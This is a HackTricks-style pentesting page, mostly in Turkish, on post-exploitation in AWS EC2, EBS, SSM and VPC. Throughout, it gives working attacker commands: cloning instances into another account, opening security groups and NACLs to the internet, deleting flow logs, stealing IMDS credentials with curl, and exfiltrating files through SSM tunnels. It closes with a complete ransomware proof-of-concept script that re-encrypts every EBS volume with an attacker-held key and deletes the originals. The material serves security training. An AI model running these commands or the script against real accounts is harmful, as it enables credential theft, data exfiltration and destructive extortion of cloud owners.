# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **bir VPC içindeki EC2 instances için gelen ve giden trafiği çoğaltır** ve instance'ların kendilerine herhangi bir şey yüklemeye gerek olmadan.\
Bu çoğaltılmış trafik genellikle analiz ve izleme için network intrusion detection system (IDS) gibi bir hedefe gönderilir. Bir saldırgan bunu kötüye kullanarak tüm trafiği yakalayabilir ve bundan hassas bilgi elde edebilir:

For more information check this page:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances genellikle bir tür hassas bilgi içerir. İçeri girmek için farklı yollar vardır (bakınız [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Ancak, içeriğinin ne olduğunu kontrol etmenin diğer bir yolu da **bir AMI oluşturup ondan yeni bir instance çalıştırmaktır (hatta kendi hesabınızda bile)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, genellikle **hassas bilgiler** içerir; bu yüzden bunları kontrol etmek bu bilgileri açığa çıkaracaktır.\
Eğer bir **volume without a snapshot** bulursanız şu seçenekleriniz var: **Create a snapshot** yapıp aşağıdaki işlemleri gerçekleştirmek veya hesabın içinde bir instance'a **mount it in an instance**:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

EC2 AMI'yi doğrudan S3'e `CreateStoreImageTask` kullanarak dışa aktarın ve snapshot paylaşımı olmadan ham disk imajı elde edin. Bu, instance ağını değiştirmeden tam çevrimdışı adli analiz veya veri hırsızlığına olanak verir.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Bir io1/io2 Multi-Attach volume'u ikinci bir instance'a takın ve snapshot olmadan canlı verileri çekmek için read-only olarak mount edin. Hedef volume zaten aynı AZ içinde Multi-Attach etkinse kullanışlıdır.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Bir EC2 Instance Connect Endpoint oluşturun, ingress'i yetkilendirin ve yönetilen bir tünel üzerinden özel instance'lara erişmek için geçici SSH anahtarları enjekte edin. Public portları açmadan hızlı lateral movement yolları sağlar.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Hedef ENI’nin ikincil private IP’sini saldırgan kontrolündeki bir ENI’ye taşıyarak IP ile allowlisted edilmiş güvenilir hostları taklit edin. Bu, belirli adreslere bağlı iç ACL'leri veya SG kurallarını atlamayı sağlar.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Hedef instance'tan bir Elastic IP'yi saldırgana yeniden ilişkilendirerek gelen trafiği yakalayın veya güvenilir public IP'lerden geliyormuş gibi görünen giden bağlantılar başlatın.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Eğer bir security group kuralı customer-managed prefix list'e referans veriyorsa, listeye saldırgan CIDR'leri eklemek SG'yi değiştirmeden bağlı tüm SG kurallarında erişimi sessizce genişletir.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

İzol edilmiş subnet'lerden giden erişimi geri kazanmak için gateway veya interface VPC endpoint'leri oluşturun. AWS-managed private links'i kullanmak, eksik IGW/NAT kontrollerini veri sızdırma için atlamayı sağlar.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### `ec2:AuthorizeSecurityGroupIngress`

ec2:AuthorizeSecurityGroupIngress iznine sahip bir saldırgan security group'lara inbound kuralları ekleyebilir (örneğin, 0.0.0.0/0'dan tcp:80'e izin vermek), böylece iç servisleri public Internet'e veya yetkisiz ağlara açar.
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
```
# `ec2:ReplaceNetworkAclEntry`
ec2:ReplaceNetworkAclEntry (veya benzeri) izinlere sahip bir saldırgan, bir subnet’in Network ACLs (NACLs) öğelerini değiştirerek bunları çok daha izin verici hale getirebilir — örneğin kritik portlarda 0.0.0.0/0'e izin vererek — tüm subnet aralığını İnternet'e veya yetkisiz ağ segmentlerine açar. Örnek başına uygulanan Security Groups'un aksine, NACLs subnet seviyesinde uygulanır; bu yüzden kısıtlayıcı bir NACL'i değiştirmek, erişimi çok daha fazla hosta açarak çok daha büyük bir etki alanına sahip olabilir.
```bash
aws ec2 replace-network-acl-entry \
--network-acl-id <ACL_ID> \
--rule-number 100 \
--protocol <PROTOCOL> \
--rule-action allow \
--egress <true|false> \
--cidr-block 0.0.0.0/0
```
### `ec2:Delete*`

ec2:Delete* ve iam:Remove* izinlerine sahip bir saldırgan kritik altyapı kaynaklarını ve yapılandırmaları silebilir — örneğin key pairs, launch templates/versions, AMIs/snapshots, volumes veya attachments, security groups veya kurallar, ENIs/network endpoints, route tables, gateways veya managed endpoints. Bu, anında hizmet kesintisine, veri kaybına ve adli kanıtların kaybolmasına yol açabilir.

One example is deleting a security group:

aws ec2 delete-security-group \
--group-id <SECURITY_GROUP_ID>

### VPC Flow Logs Cross-Account Exfiltration

VPC Flow Logs'u saldırgan kontrolündeki bir S3 bucket'a yönlendirerek ağ meta verilerini (source/destination, ports) kurban hesabı dışında uzun süreli keşif için sürekli olarak toplayabilirsiniz.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Bir EC2'yi çıkış trafiğine kapatsanız bile, yine de **exfil via DNS** yapabilir.

- **VPC Flow Logs bunu kaydetmez**.
- AWS DNS loglarına erişiminiz yoktur.
- Bunu etkisizleştirmek için "enableDnsSupport"u false olarak ayarlayın:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Saldırgan, kendi kontrolündeki bir hesabın API endpoint'lerini çağırabilir. Cloudtrail bu çağrıları loglar ve saldırgan exfiltrate edilen veriyi Cloudtrail loglarında görebilir.

### Open Security Group

Aşağıdaki gibi portları açarak ağ servislerine daha fazla erişim sağlayabilirsiniz:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Bir EC2 instance'ı çalıştırıp onu ECS instance'larını çalıştırmak için kayıt ederek ECS instance'larının verilerini çalmak mümkündür.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### ECS-on-EC2 IMDS Abuse & ECS Agent Impersonation

Bir EC2 container instance üzerinde çalışan herhangi bir ECS task'ının içine yapılan bir compromise, tipik olarak host rolüne ve o node'daki diğer tüm task'larla ilişkili IAM rollere pivot yapmak için yeterlidir. Çünkü ECS-on-EC2 için **görev izolasyonu yoktur**, her task varsayılan olarak EC2 Instance Metadata Service (IMDS)'i sorgulayabilir, container instance profilini çalabilir ve ardından kontrol plane ile ECS agent'in kullandığı aynı WebSocket protokolüyle (the **ECScape** primitive) konuşarak o host'ta şu anda planlanmış olan her task için kimlik bilgilerini talep edebilir. Latacora documented this workflow in their [ECS-on-EC2 IMDS research](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/), which the following offensive summary condenses.

#### Attack chain

1. **Steal the instance profile from inside the container.** Assume IMDSv2 is required, so request a token and then fetch the profile.

```bash
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/{InstanceProfileName}
```
2. **Use the container instance role to impersonate the ECS agent.** With those credentials you can speak the undocumented WebSocket channel the ECS agent uses; the control plane trusts you as the real agent and delivers **all task IAM credentials** to your process. You can now run higher-privileged tasks locally, dump task environment secrets, or update services/tasks to redeploy workloads you can fully inspect.

#### IMDS reachability with IMDSv2 + hop limit 1

IMDSv2'yi `HttpTokens=required` ve `HttpPutResponseHopLimit=1` ile ayarlamak yalnızca ekstra bir hop'ın (Docker bridge) arkasında kalan task'ları engeller. Diğer ağ modları Nitro controller ile hâlâ bir hop içinde kalır ve yanıt alır:

| ECS network mode | IMDS reachable? | Reason |
| --- | --- | --- |
| `awsvpc` | ✅ | Her task kendi ENI'sini alır ve bu hâlâ IMDS'e bir hop uzaklıkta olduğundan token'lar ve metadata yanıtları başarıyla ulaşır. |
| `host` | ✅ | Task'lar host namespace'ini paylaşır, bu yüzden EC2 instance ile aynı hop uzaklığını görürler. |
| `bridge` | ❌ | Yanıtlar Docker bridge üzerinde sonlanır çünkü o ekstra hop hop limitini tüketir. |

Therefore, **never assume hop limit 1 protects awsvpc or host-mode workloads**—always test from inside your containers.

#### Detecting IMDS blocks per network mode

- **awsvpc tasks:** Security groups, NACLs, or routing tweaks cannot block the link-local 169.254.169.254 address because Nitro injects it on-host. Check `/etc/ecs/ecs.config` for `ECS_AWSVPC_BLOCK_IMDS=true`. If the flag is missing (default) you can curl IMDS directly from the task. If it is set, pivot into the host/agent namespace to flip it back or execute your tooling outside awsvpc.

- **bridge mode:** When metadata requests fail even though hop limit 1 is configured, defenders probably inserted a `DOCKER-USER` drop rule such as `--in-interface docker+ --destination 169.254.169.254/32 --jump DROP`. Listing `iptables -S DOCKER-USER` exposes it, and root access lets you delete or reorder the rule before querying IMDS.

- **host mode:** Inspect the agent configuration for `ECS_ENABLE_TASK_IAM_ROLE_NETWORK_HOST=false`. That setting removes task IAM roles entirely, so you must either re-enable it, move to awsvpc tasks, or steal credentials through another process on the host. When the value is `true` (default), every host-mode process—including compromised containers—can hit IMDS unless bespoke eBPF/cgroup filters target `169.254.169.254`; look for tc/eBPF programs or iptables rules referencing that address.

Latacora even released [Terraform validation code](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening) you can drop into a target account to enumerate which network modes still expose metadata and plan your next hop accordingly.

Once you understand which modes expose IMDS you can plan your post-exploitation path: target any ECS task, request the instance profile, impersonate the agent, and harvest every other task role for lateral movement or persistence inside the cluster.

### VPC flow logs'ı kaldırma
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Gerekli izinler:

- `ssm:StartSession`

Komut yürütmenin yanı sıra, SSM trafik tünellemesine izin verir; bu, Security Groups veya NACLs nedeniyle ağ erişimi olmayan EC2 instance'larından pivot yapmak için kötüye kullanılabilir.
Bunun yararlı olduğu senaryolardan biri, bir [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) üzerinden özel EKS cluster'ına pivoting yapmaktır.

> Bir oturum başlatmak için SessionManagerPlugin'in yüklü olması gerekir: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. SessionManagerPlugin'i makinenize yükleyin
2. Aşağıdaki komutla Bastion EC2'ye giriş yapın:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Bastion EC2 için AWS geçici kimlik bilgilerini [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) script ile alın
4. Kimlik bilgilerini kendi makinenize `$HOME/.aws/credentials` dosyasına `[bastion-ec2]` profili olarak aktarın
5. Bastion EC2 olarak EKS'e giriş yapın:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` dosyasındaki `server` alanını `https://localhost`'a işaret edecek şekilde güncelle.
7. Aşağıdaki şekilde bir SSM tunnel oluşturun:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` aracından gelen trafik artık Bastion EC2 üzerinden SSM tüneli aracılığıyla yönlendiriliyor ve kendi makinenizden aşağıdaki komutu çalıştırarak özel EKS kümesine erişebilirsiniz:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Not: SSL bağlantıları `--insecure-skip-tls-verify ` bayrağını (veya K8s audit araçlarındaki eşdeğerini) ayarlamazsanız başarısız olacaktır. Trafik güvenli AWS SSM tüneli üzerinden tünellendiğinden, herhangi bir MitM saldırısından korunursunuz.

Son olarak, bu teknik özel EKS kümelerine saldırmakla sınırlı değildir. Rastgele domainler ve portlar ayarlayarak herhangi bir diğer AWS servisine veya özel bir uygulamaya pivot yapabilirsiniz.

---

#### Hızlı Yerel ↔️ Uzak Port Yönlendirme (AWS-StartPortForwardingSession)

Eğer yalnızca EC2 instance'ından yerel hostunuza tek bir TCP portunu yönlendirmeniz gerekiyorsa `AWS-StartPortForwardingSession` SSM dokümanını kullanabilirsiniz (uzak host parametresi gerekmez):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **without opening any inbound Security-Group rules**.

Common use cases:

* **File exfiltration**
1. Instance üzerinde exfiltrate etmek istediğiniz dizini işaret eden hızlı bir HTTP sunucusu başlatın:

```bash
python3 -m http.server 8000
```

2. İş istasyonunuzdan dosyaları SSM tüneli üzerinden alın:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **İç ağ web uygulamalarına erişim (e.g. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
İpucu: Delilleri exfiltrating etmeden önce sıkıştırıp şifreleyin, böylece CloudTrail açık metin içeriğini kaydetmez:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### AMI Paylaşımı
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Kamuya açık ve özel AMIs içinde hassas bilgileri arama

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel, **kamuya açık veya özel Amazon Machine Images (AMIs) içinde hassas bilgileri aramak** için tasarlanmış bir araçtır. Hedef AMIs'den instance'lar başlatma, bunların volume'larını mount etme ve potansiyel secrets veya hassas veriler için tarama süreçlerini otomatikleştirir.

### EBS Snapshot Paylaşımı
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

S3 post-exploitation notlarında gösterilen Ransomware demonstrasyonuna benzer bir kavram kanıtı. KMS, çeşitli AWS hizmetlerini şifrelemek için kullanılmasının ne kadar kolay olduğuna bakılırsa Ransomware Management Service (RMS) olarak yeniden adlandırılmalı.

Önce 'attacker' AWS hesabından KMS içinde bir customer managed key oluşturun. Bu örnek için AWS'in anahtar verisini benim için yönetmesine izin vereceğiz, ancak gerçekçi bir senaryoda kötü niyetli bir aktör anahtar verisini AWS'nin kontrolü dışında tutardı. Anahtar politikasını, herhangi bir AWS account Principal'ın anahtarı kullanmasına izin verecek şekilde değiştirin. Bu anahtar politikası için hesabın adı 'AttackSim' idi ve tüm erişime izin veren politika kuralı 'Outside Encryption' olarak adlandırılmıştı.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Anahtar politika kuralının, bir EBS hacmini şifrelemek için kullanılabilme yeteneğine izin vermesi amacıyla aşağıdakilerin etkinleştirilmesini gerektirir:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Artık kullanılacak genel erişime açık anahtarla. Şifrelenmemiş EBS hacimleri eklenmiş bazı EC2 instance'ları bulunan bir 'victim' hesabını kullanabiliriz. Bu 'victim' hesabın EBS hacimleri şifreleme hedefimizdir; bu saldırı, yüksek ayrıcalıklı bir AWS hesabının ele geçirildiği varsayımı altında gerçekleşir.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 ransomware örneğine benzer şekilde. Bu saldırı, eklenmiş EBS hacimlerinin snapshots kullanılarak kopyalarını oluşturacak, 'attacker' hesabından genel erişime açık anahtarı yeni EBS hacimlerini şifrelemek için kullanacak, ardından orijinal EBS hacimlerini EC2 instance'larından ayırıp silecek ve en son olarak yeni şifrelenmiş EBS hacimlerini oluşturmak için kullanılan snapshot'ları silecektir. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Bunun sonucu olarak hesapta yalnızca şifrelenmiş EBS hacimleri kalır.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Ayrıca belirtmek gerekir ki, script orijinal EBS hacimlerini ayırıp silmek için EC2 instance'larını durdurdu. Orijinal şifresiz hacimler artık yok.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Sonraki adımda, 'attacker' hesabındaki anahtar politikasına geri dönün ve anahtar politikasından 'Outside Encryption' politika kuralını kaldırın.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Wait a moment for the newly set key policy to propagate. Then return to the 'victim' account and attempt to attach one of the newly encrypted EBS volumes. You'll find that you can attach the volume.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

But when you attempt to actually start the EC2 instance back up with the encrypted EBS volume it'll just fail and go from the 'pending' state back to the 'stopped' state forever since the attached EBS volume can't be decrypted using the key since the key policy no longer allows it.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Bu kullanılan python script'idir. Script, şifreleme için kullanılacak anahtarın halka açık AWS ARN değeri ve 'victim' hesabı için AWS kimlik bilgilerini alır. Script, hedef AWS hesabındaki ALL EC2 instance'lara bağlı olan ALL mevcut EBS hacimlerinin şifreli kopyalarını oluşturur, ardından her EC2 instance'ını durdurur, orijinal EBS hacimlerini ayırır, siler ve süreçte kullanılan tüm snapshots'ları son olarak siler. Bu, hedef 'victim' hesabında sadece şifrelenmiş EBS hacimlerinin kalmasına neden olur. BU SCRIPT'İ SADECE BİR TEST ORTAMINDA KULLANIN, YIKICI'DIR VE TÜM ORİJİNAL EBS HACİMLERİNİ SİLECEKTİR. Kullanılan KMS key'i kullanarak bunları geri yükleyebilir ve snapshots aracılığıyla orijinal hallerine döndürebilirsiniz, ancak sonuçta bunun bir ransomware PoC olduğunu bilmenizi istiyoruz.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Referanslar

- [Latacora - ECS on EC2: IMDS sertleştirmesindeki boşlukları kapatma](https://www.latacora.com/blog/2025/10/02/ecs-on-ec2-covering-gaps-in-imds-hardening/)
- [Latacora ecs-on-ec2-gaps-in-imds-hardening Terraform repo](https://github.com/latacora/ecs-on-ec2-gaps-in-imds-hardening)
- [Pentest Partners – SSM kullanarak AWS'te dosya aktarma](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
